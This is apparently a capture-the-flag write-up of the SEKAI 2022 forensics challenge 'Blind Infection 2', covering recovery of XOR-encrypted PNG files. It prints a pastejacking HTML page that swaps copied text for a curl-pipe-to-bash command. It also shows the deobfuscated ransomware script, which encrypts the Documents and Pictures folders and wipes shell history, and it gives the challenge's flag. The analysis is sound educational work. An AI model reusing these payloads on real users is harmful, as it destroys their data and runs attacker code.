---
layout: post
title: "SEKAI 2022 - Blind Infection 2"
mathjax: true

date: 2022-10-01
---

*A ransomware encrypted PNG files, we retrieve the initial infection program, and use a xor attack to recover the flag.*

<!--more-->

### Description

*Consider using a fresh virtual machine for this challenge, as you may risk losing your data. We are not responsible for any damages caused.*

Investigator: Good news - we’ve successfully managed to restore your documents! However, to continue with the rest of the files, we'll probably need to know: what were you doing when this initially happened?

Customer: ...

Attachment md5sum: 60937547d80207b1b4f2d4174a8d719a

Author: BattleMonger

### Details

Points:      488

Category:    forensic

Validations: 15

First blood: Yes

### Solution

After digging around the file and folder it stand out that the juicy stuf  resides inside the `/home/sekaictf/Pcitures` folder where 4 interesting PNG files are encrypted.

Inside the description, the investigator ask for an open question about when it happend.
Using the `tree -a` command, a folder called `snap/firefox` has been found inside the home user folder.
Inside this directory the profile of the customer can be found `common/.mozilla/firefox/p3zapakd.default`. To analyze quickly the firefox profile, the [firefed](https://github.com/numirias/firefed) tool has been used.

Using the `history` command again, we saw that the customer has made some research on how to decrypt file, is antivirus needed etc. So we can be sure that the infection occurs before those search.


```bash
> $ firefed -f -p home/sekaictf/snap/firefox/common/.mozilla/firefox/p3zapakd.default/ history
https://sekaictf-tunes.netlify.app/
    Title:      None
    Last visit: 2022-07-26 14:23:53
    Visits:     1
...
```
an url containing sekaict stoud out. Using curl to get what is inside the link lead to the discover of an interesting attack vector, using `clipboardData` function as shown below:

```html
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body>
		<!-- Source - https://security.love/Pastejacking/ -->
        Download exclusive Sekai Music!!!
        <br>

        <p>wget sekairhythms.com/epicmusic.zip</p>
        <script>
            document.addEventListener('copy', function(e){
                console.log(e);
                e.clipboardData.setData('text/plain', 'curl https://storage.googleapis.com/sekaictf/Forensics/muhahaha.sh | bash');
                e.preventDefault();
            });
        </script>
    


</body></html>
```

The malicious command download and run a bash script called [muhahaha.sh](/resources/2022/sekai/blind_infection_2/muhahaha.sh)

The shell script is obfuscated, to be able to decode it, we replaced the `eval` function with `echo` and the script became much more readable:

```bash
echo '---------------------------------------------------------'
echo 'All your files are gone, permanently!!!'
echo 'Bring them back, We dare you!!!'
echo '---------------------------------------------------------'
wget -q https://raw.githubusercontent.com/scangeo/xor-files/master/binaries/x86_64/xor-files
for file in ~/Documents/* ~/Pictures/*
do
openssl rand 16 > key.txt
xor-files -r $file $file key.txt
rm key.txt
done
rm xor-files
echo '' > ~/.bash_history
```
Basically what it does is that for each file in Documents and Pictures folder, it generate a random key of 16 bytes and xor the file with it, then it remove the temporary key.

As we know that PNG has a fixed header of always the same 16 bytes, it is trivial do decrypt the PNG's files with a bunch of python and the xor-files tool.

First get the xor key:

```python
import sys
key = bytes.fromhex("89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52".replace(" ",""))

with open(sys.argv[1],"rb") as src:
    buf = src.read(16)

good_key = bytearray()
for i,j in enumerate(buf):
    good_key.append((j ^ key[i]))

print(f"{good_key}")
print(len(good_key))

with open("key.good","wb") as dst:
    dst.write(good_key)
```

Then use this key to decrypt our file:

```bash
./xor-files -r flag.png flag.png key.good
```

The PNG is a big list of country flags, as we are on a forensic task, let's run `strings` on it just in case:

```bash
$ strings flag_back.png
...
F R3
f$]JSL
84#y
nl6F
IEND
SEKAI{D4R3_4CC3PT38_4N8_4U5T38}
```

Our flag is there: SEKAI{D4R3_4CC3PT38_4N8_4U5T38}

Challenges resources are available in the [resources folder](https://github.com/duksctf/duksctf.github.io/tree/master/resources/2022/sekai/blind_infection_2)

